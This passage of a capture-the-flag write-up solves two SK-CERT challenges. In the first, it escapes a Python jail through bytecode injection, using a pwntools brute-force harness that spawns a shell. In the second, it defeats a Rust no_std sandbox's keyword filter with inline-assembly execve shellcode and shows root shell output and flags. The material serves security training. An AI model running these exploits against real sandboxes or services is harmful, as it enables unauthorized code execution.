</span></span></code></pre></div><h4 id="gaining-root-shell-via-bytecode-injection">Gaining Root Shell via Bytecode Injection</h4>
<p>After successfully retrieving the root password by navigating deep into Pythonâ€™s object model (as explained earlier), I gained access to the <code>su</code> command. This unlocked the ability to <strong>rewrite methods</strong> within the application a powerful privilege.</p>
<p>The plan was to <strong>hijack the <code>touch</code> command</strong>, whose implementation lives in:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">a</span><span class="o">/</span><span class="fm">__init__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">__builtins__</span><span class="o">/</span><span class="n">help</span><span class="o">/</span><span class="vm">__class__</span><span class="o">/</span><span class="fm">__call__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">__main__</span><span class="o">/</span><span class="n">DirShell</span><span class="o">/</span><span class="n">touch</span><span class="o">/</span><span class="vm">__code__</span><span class="err">`</span>
</span></span></code></pre></div><h4 id="python-bytecode-injection">Python Bytecode Injection</h4>
<p>The key to the exploit was rewriting the <code>co_code</code> of the <code>touch</code> method with <strong>custom Python bytecode</strong>, allowing us to hijack its behavior.</p>
<p>My payload built a new <code>co_code</code> byte sequence that:</p>
<ol>
<li>
<p>Loaded the <code>__builtins__</code> dict using a crafted <code>LOAD_FAST</code> offset.</p>
</li>
<li>
<p>Accessed <code>__builtins__[&quot;exec&quot;]</code>.</p>
</li>
<li>
<p>Executed <code>exec(input(...))</code> to get full code execution.</p>
</li>
</ol>
<p>However, since the locals layout was unknown, and LOAD_FAST uses an index, I had to brute-force the right index (<code>x</code>) to find the one pointing to <code>__builtins__</code>.</p>
<p>Hereâ€™s a snippet from the brute-force harness:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">OOB</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">bytes</span><span class="p">([</span><span class="n">x</span><span class="p">])</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>     <span class="o">*</span><span class="p">([</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">],</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">256</span><span class="p">]</span> <span class="k">if</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">256</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="p">[]),</span>     <span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_FAST&#39;</span><span class="p">],</span> <span class="n">x</span> <span class="o">%</span> <span class="mi">256</span><span class="p">,</span> <span class="p">]])</span><span class="err">`</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">dis</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">opcode</span> <span class="kn">import</span> <span class="n">opmap</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">def</span> <span class="nf">rec_cd</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;cd </span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">assemble</span><span class="p">(</span><span class="n">ops</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">for</span> <span class="n">op</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">ops</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">opc</span> <span class="o">=</span> <span class="n">dis</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="n">op</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">ret</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">opc</span><span class="p">,</span> <span class="n">arg</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">ROOT_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&amp;^&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="mi">202</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Trying </span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="c1"># r = process([&#34;python3&#34;, &#34;dirshell.py&#34;])</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;exp.cybergame.sk&#34;</span><span class="p">,</span> <span class="mi">7001</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="c1"># rec_cd(&#34;/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__&#34;)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;su&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">ROOT_PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">rec_cd</span><span class="p">(</span><span class="s2">&#34;/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="c1"># x = 265</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">OOB</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">bytes</span><span class="p">([</span><span class="n">x</span><span class="p">])</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="o">*</span><span class="p">([</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">],</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">if</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">256</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="p">[]),</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_FAST&#39;</span><span class="p">],</span> <span class="n">x</span> <span class="o">%</span> <span class="mi">256</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="p">]])</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">co_code</span> <span class="o">=</span> <span class="n">OOB</span> <span class="o">+</span> <span class="n">assemble</span><span class="p">([</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">            <span class="p">(</span><span class="s2">&#34;LOAD_FAST&#34;</span><span class="p">,</span>     <span class="mi">2</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">            <span class="p">(</span><span class="s2">&#34;BINARY_SUBSCR&#34;</span><span class="p">,</span>  <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">            <span class="p">(</span><span class="s2">&#34;LOAD_FAST&#34;</span><span class="p">,</span>     <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="p">])</span> <span class="o">+</span> <span class="n">OOB</span> <span class="o">+</span> <span class="n">assemble</span><span class="p">([</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">            <span class="p">(</span><span class="s2">&#34;CALL_FUNCTION&#34;</span><span class="p">,</span>  <span class="mi">2</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="p">(</span><span class="s2">&#34;RETURN_VALUE&#34;</span><span class="p">,</span>   <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="p">])</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="c1"># print(co_code)</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        
</span></span><span class="line"><span class="ln">50</span><span class="cl">
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="c1"># 265 EXEC</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        
</span></span><span class="line"><span class="ln">53</span><span class="cl">
</span></span><span class="line"><span class="ln">54</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;rewrite co_code&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">co_code</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="n">rec_cd</span><span class="p">(</span><span class="s2">&#34;/..&#34;</span><span class="o">*</span><span class="mi">17</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;touch exec(input(&#39;READYREADYREADY</span><span class="se">\\</span><span class="s2">n&#39;))&#34;&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;exec&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">
</span></span><span class="line"><span class="ln">61</span><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;file contents: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">62</span><span class="cl">        <span class="n">da</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">da</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">        
</span></span><span class="line"><span class="ln">65</span><span class="cl">        <span class="k">if</span> <span class="n">da</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;READYREADYREADY&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;GO FLAG GOGHGOGHGOGHGO&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">73</span><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>I assembled the final bytecode using Python&rsquo;s built-in <code>dis.opmap</code>, creating valid instructions for Python 3.9 â€” which was crucial, since the remote system used that specific version.</p>
<p>Once the injected function was in place, I navigated back to root and triggered it by running:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">touch</span> <span class="n">exec</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;READYREADYREADY</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p>If the injection worked, the output was simply: <code>READYREADYREADY</code></p>
<p>This was my signal that <code>exec()</code> had been successfully injected. From there, I just launched a PTY shell:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="err">`</span>
</span></span></code></pre></div><p>And that was game over. ðŸ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
</span></span></code></pre></div><h4 id="blazing-fast-memory-safe-interpreter">Blazing-fast, memory-safe interpreter</h4>
<p>Description</p>
<blockquote>
<p>I made a Rust code interpreter where you can run your rust code. I made it very safe so you donâ€™t hack me.</p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">HEADER</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">#![no_std]
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">#![no_main]
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">use core::panic::PanicInfo;
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s2">#[panic_handler]
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s2">fn panic(_info: &amp;PanicInfo) -&gt; ! {
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s2">    loop </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s2">#[unsafe(no_mangle)]
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s2">pub extern &#34;C&#34; fn _start() -&gt; () {
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">FOOTER</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">def</span> <span class="nf">checker</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span> <span class="n">code</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;!&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;libc&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;std&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;syscall&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;include&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Give me code&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">checker</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Go away you hacker&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./src/main.rs&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">)</span>           
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">)</span>           
</span></span><span class="line"><span class="ln">42</span><span class="cl">
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Building - this may take a while...&#34;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="p">[</span><span class="s2">&#34;cargo&#34;</span><span class="p">,</span> <span class="s2">&#34;build&#34;</span><span class="p">,</span> <span class="s2">&#34;--target&#34;</span><span class="p">,</span> <span class="s2">&#34;x86_64-unknown-none&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="n">text</span><span class="o">=</span><span class="kc">True</span>  
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="k">if</span> <span class="n">out</span><span class="o">.</span><span class="n">returncode</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;failed - exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Running...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;cargo&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;--target&#34;</span><span class="p">,</span> <span class="s2">&#34;x86_64-unknown-none&#34;</span><span class="p">])</span>
</span></span></code></pre></div><p>Solution</p>
<p>This challenge gave us a sandboxed Rust runtime with a constrained custom <code>main.rs</code> environment.</p>
<p>After researching Rustâ€™s inline assembly and raw x86-64 opcodes, I discovered that we could <strong>manually emit <code>syscall</code></strong> using the raw instruction bytes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">.</span><span class="n">byte</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="w">  </span><span class="p">;</span><span class="w"> </span><span class="n">syscall</span><span class="w">
</span></span></span></code></pre></div><p>Combined with <code>core::arch::asm</code>, we could construct the entire RCE payload manually without relying on filtered terms.</p>
<p>Hereâ€™s the payload that spawns <code>/bin/sh</code> via syscall 59 (<code>execve</code>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">core</span>::<span class="n">arch</span>::<span class="n">asm</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w">    </span><span class="fm">asm!</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">        </span><span class="s">&#34;xor rsi, rsi&#34;</span><span class="p">,</span><span class="w">                        </span><span class="c1">// NULL argv
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="s">&#34;push rsi&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">        </span><span class="s">&#34;mov rbx, 0x68732f2f6e69622f&#34;</span><span class="p">,</span><span class="w">         </span><span class="c1">// //bin/sh
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="s">&#34;push rbx&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">        </span><span class="s">&#34;mov rdi, rsp&#34;</span><span class="p">,</span><span class="w">                        </span><span class="c1">// pointer to &#34;/bin//sh&#34;
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="s">&#34;xor rdx, rdx&#34;</span><span class="p">,</span><span class="w">                        </span><span class="c1">// NULL envp
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="s">&#34;mov rax, 59&#34;</span><span class="p">,</span><span class="w">                         </span><span class="c1">// syscall: execve
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="s">&#34;.byte 0x0F, 0x05&#34;</span><span class="p">,</span><span class="w">                    </span><span class="c1">// syscall
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span><span class="w">        </span><span class="n">options</span><span class="p">(</span><span class="n">noreturn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">    </span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>The build system only accepted <strong>single-line input</strong>, and multi-line <code>asm!</code> blocks were error-prone when passed via <code>input()</code>.</p>
<p>So I collapsed the code into a single line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">core</span>::<span class="n">arch</span>::<span class="n">asm</span><span class="p">;</span><span class="k">unsafe</span><span class="p">{</span><span class="fm">asm!</span><span class="p">(</span><span class="s">&#34;xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05&#34;</span><span class="p">,</span><span class="n">options</span><span class="p">(</span><span class="n">noreturn</span><span class="p">));}</span><span class="w">
</span></span></span></code></pre></div><p>This successfully compiled under <code>cargo build --target x86_64-unknown-none</code>, bypassed the checks, and gave me a shell from <code>_start()</code>!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"> nc exp.cybergame.sk <span class="m">7010</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">Give me code&gt; use core::arch::asm<span class="p">;</span>unsafe<span class="o">{</span>asm!<span class="o">(</span><span class="s2">&#34;xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05&#34;</span>,options<span class="o">(</span>noreturn<span class="o">))</span><span class="p">;</span><span class="o">}</span> 
</span></span><span class="line"><span class="ln">3</span><span class="cl">Building - this may take a <span class="k">while</span>...done
</span></span><span class="line"><span class="ln">4</span><span class="cl">Running...
</span></span><span class="line"><span class="ln">5</span><span class="cl">id     
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">cat flag.txt
</span></span><span class="line"><span class="ln">8</span><span class="cl">SK-CERT<span class="o">{</span>v3ry_600d_p3rf0rm4nc3<span class="o">}</span>
